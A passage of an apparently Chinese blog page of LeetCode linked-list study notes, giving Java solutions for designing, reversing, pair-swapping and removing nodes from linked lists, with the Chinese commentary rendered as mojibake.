class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ListNode</span>&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    ListNode next;</span><br><span class="line">    ListNode()&#123;&#125;</span><br><span class="line">    ListNode(<span class="type">int</span> val)&#123;</span><br><span class="line">        <span class="built_in">this</span>.val = val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyLinkedList</span>&#123;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    ListNode head;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyLinkedList</span><span class="params">()</span>&#123;</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">        head = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= index; i++)&#123;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cur.val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtHead</span><span class="params">(<span class="type">int</span> val)</span>&#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span class="line">        newNode.next = head.next;</span><br><span class="line">        head.next = newNode;</span><br><span class="line">        size++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtTail</span><span class="params">(<span class="type">int</span> val)</span>&#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">newNode</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span>(cur.next != <span class="literal">null</span>)&#123;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line">        cur.next = newNode;</span><br><span class="line">        size++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtIndex</span><span class="params">(<span class="type">int</span> index, <span class="type">int</span> val)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &gt; size)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            index = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        size++;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">pred</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;index;i++)&#123;</span><br><span class="line">            pred = pred.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">toAdd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span class="line">        toAdd.next = pred.next;</span><br><span class="line">        pred.next = toAdd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteAtIndex</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        size--;</span><br><span class="line">        ListNode pred= head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; index;i++)&#123;</span><br><span class="line">            pred = pred.next;</span><br><span class="line">        &#125;</span><br><span class="line">        pred.next = pred.next.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒé“¾è¡¨ç‰ˆæœ¬</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">ListNode</span>&#123;</span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    ListNode next,prev;</span><br><span class="line">    ListNode()&#123;&#125;</span><br><span class="line">    ListNode(<span class="type">int</span> val)&#123;</span><br><span class="line">        <span class="built_in">this</span>.val = val;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyLinkedList</span>&#123;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">    ListNode head,tail;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MyLinkedList</span><span class="params">()</span>&#123;</span><br><span class="line">        size = <span class="number">0</span>;</span><br><span class="line">        head = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        tail = <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        head.next = tail;</span><br><span class="line">        tail.prev = head;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">get</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size) <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="comment">//åˆ¤æ–­å“ªè¾¹æ—¶é—´æ›´çŸ­</span></span><br><span class="line">        <span class="keyword">if</span>(index &gt;= size /<span class="number">2</span> )&#123;</span><br><span class="line">            cur = tail;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; size - index; i++)&#123;</span><br><span class="line">                cur = cur.prev;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt;= index; i++)&#123;</span><br><span class="line">                cur = cur.next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> cur.val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtHead</span><span class="params">(<span class="type">int</span> val)</span>&#123;</span><br><span class="line">        addAtIndex(<span class="number">0</span>, val);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtTail</span><span class="params">(<span class="type">int</span> val)</span>&#123;</span><br><span class="line">       addAtIndex(size, val);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addAtIndex</span><span class="params">(<span class="type">int</span> index, <span class="type">int</span> val)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &gt; size)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            index = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        size++;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">pred</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;index;i++)&#123;</span><br><span class="line">            pred = pred.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">toAdd</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(val);</span><br><span class="line">        toAdd.next = pred.next;</span><br><span class="line">        pred.next.prev = toAdd;</span><br><span class="line">        toAdd.prev = pred;</span><br><span class="line">        pred.next = toAdd;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">deleteAtIndex</span><span class="params">(<span class="type">int</span> index)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(index &lt; <span class="number">0</span> || index &gt;= size)&#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        size--;</span><br><span class="line">        ListNode pred= head;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; index;i++)&#123;</span><br><span class="line">            pred = pred.next;</span><br><span class="line">        &#125;</span><br><span class="line">        pred.next.next.prev = pred;</span><br><span class="line">        pred.next = pred.next.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="206-åè½¬é“¾è¡¨"><a href="#206-åè½¬é“¾è¡¨" class="headerlink" title="206 åè½¬é“¾è¡¨"></a>206 åè½¬é“¾è¡¨</h2><p>ç»™ä½ å•é“¾è¡¨çš„å¤´èŠ‚ç‚¹ head ï¼Œè¯·ä½ åè½¬é“¾è¡¨ï¼Œå¹¶è¿”å›åè½¬åçš„é“¾è¡¨ã€‚<br>&#x2F;&#x2F; åŒæŒ‡é’ˆ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (head == <span class="literal">null</span>)  <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">tmp</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span>(cur != <span class="literal">null</span>)&#123;</span><br><span class="line">            tmp = cur.next;</span><br><span class="line">            cur.next = prev;</span><br><span class="line">            prev = cur;</span><br><span class="line">            cur = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> prev;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F; é€’å½’</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> reverse(<span class="literal">null</span>, head);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverse</span><span class="params">(ListNode prev, ListNode cur)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(cur == <span class="literal">null</span>) <span class="keyword">return</span> prev;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        temp = cur.next;</span><br><span class="line">        cur.next = prev;</span><br><span class="line">        <span class="keyword">return</span> reverse(cur, temp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F; ä»åå‘å‰é€’å½’</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="comment">// è¾¹ç¼˜æ¡ä»¶åˆ¤æ–­</span></span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(head.next == <span class="literal">null</span>) <span class="keyword">return</span> head;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// é€’å½’è°ƒç”¨ï¼Œç¿»è½¬ç¬¬äºŒä¸ªèŠ‚ç‚¹å¼€å§‹å¾€åçš„é“¾è¡¨</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">last</span> <span class="operator">=</span> reverseList(head.next);</span><br><span class="line">        <span class="comment">// ç¿»è½¬å¤´ç»“ç‚¹ä¸ç¬¬äºŒä¸ªèŠ‚ç‚¹çš„æŒ‡å‘</span></span><br><span class="line">        head.next.next = head;</span><br><span class="line">        <span class="comment">// æ­¤æ—¶çš„headèŠ‚ç‚¹ä¸ºå°¾èŠ‚ç‚¹ï¼Œnextéœ€è¦æŒ‡å‘null</span></span><br><span class="line">        head.next = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">return</span> last;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F; ä½¿ç”¨è™šèŠ‚ç‚¹çš„å¤´æ’æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummyHead</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>);</span><br><span class="line">        dummyHead.next = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span>(cur != <span class="literal">null</span>)&#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">temp</span> <span class="operator">=</span> cur.next;</span><br><span class="line">            <span class="comment">// å¤´æ’æ³•</span></span><br><span class="line">            cur.next = dummyHead.next;</span><br><span class="line">            dummyHead.next = cur;</span><br><span class="line">            cur = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummyHead.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F; ä½¿ç”¨æ ˆè§£å†³åè½¬é“¾è¡¨é—®é¢˜</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(head==<span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(head.next == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">        Stack&lt;ListNode&gt; stack = <span class="keyword">new</span> <span class="title class_">Stack</span>&lt;&gt;();</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="keyword">while</span>(cur != <span class="literal">null</span>)&#123;</span><br><span class="line">            stack.push(cur);</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">pHead</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        cur = pHead;</span><br><span class="line">        <span class="keyword">while</span>(!stack.isEmpty())&#123;</span><br><span class="line">            <span class="type">ListNode</span> <span class="variable">node</span> <span class="operator">=</span> stack.pop();</span><br><span class="line">            cur.next = node;</span><br><span class="line">            cur = cur.next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        cur.next = <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">return</span> pHead.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é“é¢˜ä¸€å¼€å§‹æ²¡æœ‰è®©prevæŒ‡å‘nullå‡ºé”™äº†</p><h2 id="24-ä¸¤ä¸¤äº¤æ¢é“¾è¡¨ä¸­çš„èŠ‚ç‚¹"><a href="#24-ä¸¤ä¸¤äº¤æ¢é“¾è¡¨ä¸­çš„èŠ‚ç‚¹" class="headerlink" title="24. ä¸¤ä¸¤äº¤æ¢é“¾è¡¨ä¸­çš„èŠ‚ç‚¹"></a>24. ä¸¤ä¸¤äº¤æ¢é“¾è¡¨ä¸­çš„èŠ‚ç‚¹</h2><p>ç»™ä½ ä¸€ä¸ªé“¾è¡¨ï¼Œä¸¤ä¸¤äº¤æ¢å…¶ä¸­ç›¸é‚»çš„èŠ‚ç‚¹ï¼Œå¹¶è¿”å›äº¤æ¢åé“¾è¡¨çš„å¤´èŠ‚ç‚¹ã€‚ä½ å¿…é¡»åœ¨ä¸ä¿®æ”¹èŠ‚ç‚¹å†…éƒ¨çš„å€¼çš„æƒ…å†µä¸‹å®Œæˆæœ¬é¢˜ï¼ˆå³ï¼Œåªèƒ½è¿›è¡ŒèŠ‚ç‚¹äº¤æ¢ï¼‰ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">swapPairs</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dumyhead</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(-<span class="number">1</span>);</span><br><span class="line">        dumyhead.next = head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> dumyhead;</span><br><span class="line">        ListNode temp;</span><br><span class="line">        ListNode firstnode;</span><br><span class="line">        ListNode secondnode;</span><br><span class="line">        <span class="keyword">while</span>(cur.next != <span class="literal">null</span> &amp;&amp; cur.next.next != <span class="literal">null</span>)&#123;</span><br><span class="line">            temp = cur.next.next.next;</span><br><span class="line">            firstnode = cur.next;</span><br><span class="line">            secondnode = cur.next.next;</span><br><span class="line">            cur.next = secondnode;</span><br><span class="line">            secondnode.next = firstnode;</span><br><span class="line">            firstnode.next = temp;</span><br><span class="line">            cur = firstnode;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dumyhead.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F; é€’å½’è§£å†³</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">swapPairs</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">null</span> || head.next == <span class="literal">null</span>) <span class="keyword">return</span> head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">next</span> <span class="operator">=</span> head.next;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">newNode</span> <span class="operator">=</span> swapPairs(next.next);</span><br><span class="line">        next.next = head;</span><br><span class="line">        head.next = newNode;</span><br><span class="line">        <span class="keyword">return</span> next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="19-åˆ é™¤é“¾è¡¨çš„å€’æ•°ç¬¬-N-ä¸ªç»“ç‚¹"><a href="#19-åˆ é™¤é“¾è¡¨çš„å€’æ•°ç¬¬-N-ä¸ªç»“ç‚¹" class="headerlink" title="19. åˆ é™¤é“¾è¡¨çš„å€’æ•°ç¬¬ N ä¸ªç»“ç‚¹"></a>19. åˆ é™¤é“¾è¡¨çš„å€’æ•°ç¬¬ N ä¸ªç»“ç‚¹</h2><p>ç»™ä½ ä¸€ä¸ªé“¾è¡¨ï¼Œåˆ é™¤é“¾è¡¨çš„å€’æ•°ç¬¬ n ä¸ªç»“ç‚¹ï¼Œå¹¶ä¸”è¿”å›é“¾è¡¨çš„å¤´ç»“ç‚¹ã€‚<br><img src="/2024/09/11/algorithm/List/image.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">removeNthFromEnd</span><span class="params">(ListNode head, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummyhead</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        dummyhead.next = head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> dummyhead;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> dummyhead;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">            fast = fast.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(fast.next != <span class="literal">null</span>)&#123;</span><br><span class="line">            slow = slow.next;</span><br><span class="line">            fast = fast.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(slow.next == fast)&#123;</span><br><span class="line">            fast = <span class="literal">null</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            slow.next = fast;   </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dummyhead.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä¸Šé¢çš„ä»£ç å¯¹äºè¾¹ç•Œæ¡ä»¶å¤„ç†ä¸å¥½ï¼Œä¸‹é¢æ˜¯ç­”æ¡ˆï¼š<br>fasté¦–å…ˆèµ°n + 1æ­¥ ï¼Œä¸ºä»€ä¹ˆæ˜¯n+1å‘¢ï¼Œå› ä¸ºåªæœ‰è¿™æ ·åŒæ—¶ç§»åŠ¨çš„æ—¶å€™slowæ‰èƒ½æŒ‡å‘åˆ é™¤èŠ‚ç‚¹çš„ä¸Šä¸€ä¸ªèŠ‚ç‚¹ï¼ˆæ–¹ä¾¿åšåˆ é™¤æ“ä½œï¼‰ï¼Œå¦‚å›¾ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">removeNthFromEnd</span><span class="params">(ListNode head, <span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummyhead</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        dummyhead.next = head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">fast</span> <span class="operator">=</span> dummyhead;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">slow</span> <span class="operator">=</span> dummyhead;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            fast = fast.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span 